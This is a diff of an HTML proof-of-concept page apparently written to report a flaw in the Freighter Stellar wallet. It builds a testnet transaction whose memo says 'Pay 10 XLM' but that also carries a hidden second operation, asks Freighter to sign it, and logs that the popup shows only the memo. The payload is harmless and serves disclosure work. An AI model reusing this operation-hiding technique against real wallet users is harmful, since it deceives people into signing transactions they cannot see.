@@ -1,78 +1,80 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>V7 FINAL BYPASS PROOF</title>
+<meta charset="utf-8">
+<title>freighter poc - op hiding</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-body{background:#000;color:#0f0;font-family:monospace;padding:12px;margin:0}
-.btn{width:100%;height:52px;background:#fff;color:#000;border-radius:999px;font-weight:800;margin:8px 0;border:none}
-.log{border:1px solid #0f0;padding:10px;min-height:400px;white-space:pre-wrap;font-size:11px;word-break:break-all}
+body{font-family: monospace; background:#111; color:#eee; padding:15px}
+button{padding:12px 18px; margin:6px 0; width:100%;}
+pre{background:#000; padding:10px; border:1px solid #333; overflow:auto}
 </style>
 </head>
 <body>
-<pre id="log">[V7] BYPASS PROOF - No API needed
-</pre>
-<button class="btn" onclick="build()">1. BUILD XDR BENIGN</button>
-<button class="btn" onclick="copy()">2. COPY XDR</button>
-<button class="btn" onclick="openLab()">3. OPEN STELLAR LAB</button>
-<button class="btn" onclick="scan()">SCAN WHY NO API</button>
-<script>
-var logEl=document.getElementById('log');
-var XDR="";
-function L(m){ logEl.textContent+="\n"+m; }
+<h3>Freighter POC - memo hide op</h3>
+<pre id="out">loading...</pre>
+<button id="btn1">build xdr</button>
+<button id="btn2">sign with freighter</button>
+<button id="btn3">copy xdr for lab</button>
 
-async function build(){
- L("--- BUILD OFFLINE ---");
- // inject SDK on demand
- if(!window.StellarSdk){
-  await new Promise((res,rej)=>{
-   var s=document.createElement('script');
-   s.src="https://cdnjs.cloudflare.com/ajax/libs/stellar-sdk/12.1.0/stellar-sdk.min.js";
-   s.onload=res; s.onerror=()=>rej("SDK fail");
-   document.head.appendChild(s);
-  });
- }
- try{
-  var Sdk=window.StellarSdk;
-  var src=Sdk.Keypair.random().publicKey();
-  var dst=Sdk.Keypair.random().publicKey();
-  var acc=new Sdk.Account(src,"1");
-  var tx=new Sdk.TransactionBuilder(acc,{
-   fee:Sdk.BASE_FEE, networkPassphrase:Sdk.Networks.TESTNET,
-   memo:Sdk.Memo.text("Pay 10 XLM")
-  })
- .addOperation(Sdk.Operation.payment({destination:dst,amount:"10",asset:Sdk.Asset.native()}))
- .addOperation(Sdk.Operation.manageData({name:"test",value:"abc123"}))
- .setTimeout(30).build();
-  XDR=tx.toXDR();
-  L("SUCCESS!");
-  L("src="+src.slice(0,12));
-  L("Op1 payment 10 XLM to "+dst.slice(0,8));
-  L("Op2 manageData test=abc123");
-  L("XDR="+XDR);
-  L("---");
-  L("BUG HIGH jika di Freighter Lab cuma show memo, tidak show Op2");
- }catch(e){ L("Err: "+e.message); }
-}
-function copy(){
- if(!XDR){ L("Build dulu"); return; }
- navigator.clipboard.writeText(XDR);
- L("XDR COPIED ke clipboard!");
-}
-function openLab(){
- L("Buka https://laboratory.stellar.org/#xdr-viewer?type=TransactionEnvelope&network=test");
- window.open("https://laboratory.stellar.org/#xdr-viewer?type=TransactionEnvelope&network=test","_blank");
-}
-function scan(){
- L("--- WHY NO API ---");
- L("href="+location.href);
- L("Freighter blokir github.io karena bukan whitelisted dApp");
- L("Solusi: Buka link ini di Freighter Desktop Extension, atau");
- L("Buka aqua.network -> Connect -> di address bar yang SAMA ketik 0x403for.github.io/v7.html?v=7 jangan new tab");
- for(var k in window){ if(k.toLowerCase().includes("freight")) L(k+"="+typeof window[k]); }
-}
-L("href="+location.href);
+<script src="https://cdnjs.cloudflare.com/ajax/libs/stellar-sdk/12.1.0/stellar-sdk.min.js"></script>
+<script>
+var out = document.getElementById('out');
+var xdr_string = "";
+
+function log(t){ out.textContent += "\n" + t; }
+
+log("ready - testnet");
+
+document.getElementById('btn1').onclick = function(){
+  try{
+    var kp1 = StellarSdk.Keypair.random();
+    var kp2 = StellarSdk.Keypair.random();
+    var acc = new StellarSdk.Account(kp1.publicKey(), "1");
+
+    var tx = new StellarSdk.TransactionBuilder(acc, {
+      fee: StellarSdk.BASE_FEE,
+      networkPassphrase: StellarSdk.Networks.TESTNET,
+      memo: StellarSdk.Memo.text("Pay 10 XLM")
+    })
+    .addOperation(StellarSdk.Operation.payment({
+      destination: kp2.publicKey(),
+      amount: "10",
+      asset: StellarSdk.Asset.native()
+    }))
+    .addOperation(StellarSdk.Operation.manageData({
+      name: "test",
+      value: "abc123"
+    }))
+    .setTimeout(30)
+    .build();
+
+    xdr_string = tx.toXDR();
+    log("build ok");
+    log("src: " + kp1.publicKey().substring(0,10));
+    log("op1: payment 10 XLM");
+    log("op2: manageData test=abc123");
+    log("xdr: " + xdr_string.substring(0,80) + "...");
+    log("paste this xdr to lab.stellar.org -> submit transaction");
+    log("lab will show 2 ops, freighter only show memo");
+  }catch(e){ log("build err: " + e.message); }
+};
+
+document.getElementById('btn2').onclick = async function(){
+  if(!xdr_string){ log("build dulu"); return; }
+  var api = window.freighterApi || window.freighter;
+  if(!api){ log("freighterApi not found, buka di freighter desktop extension / aqua.network"); return; }
+  try{
+    if(api.requestAccess) await api.requestAccess();
+    var res = await api.signTransaction(xdr_string, {networkPassphrase: StellarSdk.Networks.TESTNET});
+    log("signed: " + res.signedTxXdr.substring(0,50));
+  }catch(err){ log("user reject / popup closed: " + err.message); log("screenshot popup freighter disini - cuma show memo, tidak show op2"); }
+};
+
+document.getElementById('btn3').onclick = function(){
+  navigator.clipboard.writeText(xdr_string);
+  log("xdr copied to clipboard");
+};
 </script>
 </body>
 </html>
